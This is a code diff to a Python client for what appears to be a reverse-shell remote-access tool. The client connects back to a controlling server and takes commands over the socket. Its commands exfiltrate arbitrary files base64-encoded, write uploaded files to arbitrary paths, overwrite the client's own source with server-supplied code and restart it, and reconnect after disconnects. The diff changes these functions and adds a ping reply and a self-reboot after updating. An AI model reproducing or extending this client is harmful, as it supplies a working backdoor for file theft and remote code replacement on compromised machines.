@@ -6,7 +6,6 @@ import sys
 from os.path import expanduser, realpath
 from base64 import b64decode, b64encode
 from time import sleep
-import threading
 
 
 class Client(object):
@@ -133,6 +132,10 @@ class Client(object):
         return self
 
     def reboot_self(self):
+        try:
+            self.sock.close()
+        except socket.error:
+            pass
         restart_command = [
             '',
             realpath(__file__),
@@ -161,23 +164,23 @@ class Client(object):
         # Handle a disconnect command.
         self.send_data('confirmed')
         self.sock.close()
-        print('Sleeping for 30 seconds...')
-        sleep(30)
+        print('Sleeping for 10 seconds...')
+        sleep(10)
         self._connect_to_server()
         return self
 
-    def write_file_data(self, upload_data, upload_filename):
+    def write_file_data(self, upload_data, upload_filepath):
         """
         Write the upload_data to the upload_filename
 
         :param upload_data:
-        :param upload_filename:
+        :param upload_filepath:
         :return:
         """
 
-        with open(upload_filename, 'wb') as f:
+        with open(realpath(upload_filepath), 'wb') as f:
             f.write(b64decode(upload_data))
-        print('<', upload_filename, 'written...', '>')
+        print('<', upload_filepath, 'written...', '>')
         return
 
     def handle_file_upload(self, upload_data, upload_filename):
@@ -189,9 +192,12 @@ class Client(object):
         :return:
         """
 
-        self.send_data('Got file.')
-        t = threading.Thread(target=self.write_file_data, args=(upload_data, upload_filename))
-        t.start()
+        try:
+            self.write_file_data(upload_data, upload_filename)
+            self.send_data('Got file.')
+        except FileNotFoundError as err_msg:
+            self.send_data('Could not fine the directory to write to: {}'.format(err_msg))
+
         return self
 
     def main(self):
@@ -203,7 +209,7 @@ class Client(object):
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
-            upload_filename = False
+            upload_filepath = False
             while True:
                 data = self.receive_data()
 
@@ -245,6 +251,10 @@ class Client(object):
                             self.session_id = uuid
                         continue
 
+                    if data == 'oyster ping':
+                        self.send_data('pong')
+                        continue
+
                     if data == 'disconnect':
                         self.handle_disconnect()
                         continue
@@ -255,7 +265,7 @@ class Client(object):
                         break
 
                     # Reboot self.
-                    if data == 'oyster reboot':
+                    if data == 'shell reboot':
                         self.send_data('confirmed')
                         self.sock.close()
                         break
@@ -266,9 +276,9 @@ class Client(object):
                         sleep(1)
                         continue
 
-                    if data[:9] == 'get file ':
+                    if data[:4] == 'get ':
                         try:
-                            with open(data[9:].strip(), 'rb') as f:
+                            with open(data[4:].strip(), 'rb') as f:
                                 data = b64encode(f.read())
                                 f.close()
                         except FileNotFoundError as err_msg:
@@ -278,26 +288,29 @@ class Client(object):
                         continue
 
                     # Handle setting the file upload name.
-                    if data[:16] == 'upload_filename ':
-                        upload_filename = data[16:]
-                        self.send_data('Got filename.')
+                    if data[:16] == 'upload_filepath ':
+                        upload_filepath = data[16:]
+                        self.send_data('Got filepath.')
                         continue
 
                 if data[:11] == 'upload_data':
-                    if not upload_filename:
+                    if not upload_filepath:
                         self.send_data('Requires an upload filename.  Send with `upload_filename {filename}`.')
                         continue
                     self.send_data('Send Data')
                     upload_data = self.receive_data()
-                    self.handle_file_upload(upload_data, upload_filename)
+                    self.handle_file_upload(upload_data, upload_filepath)
                     continue
 
                 # Update the client.py file(this file here).
                 if data[:7] == 'update ':
+                    print('Overwriting self...')
                     with open('client.py', 'w') as f:
                         f.write(data[7:])
                         f.close()
                     self.send_data('Client updated...\n')
+                    print('###################### REBOOTING ######################')
+                    self.reboot_self()
                     continue
 
                 # Handle the cd command.
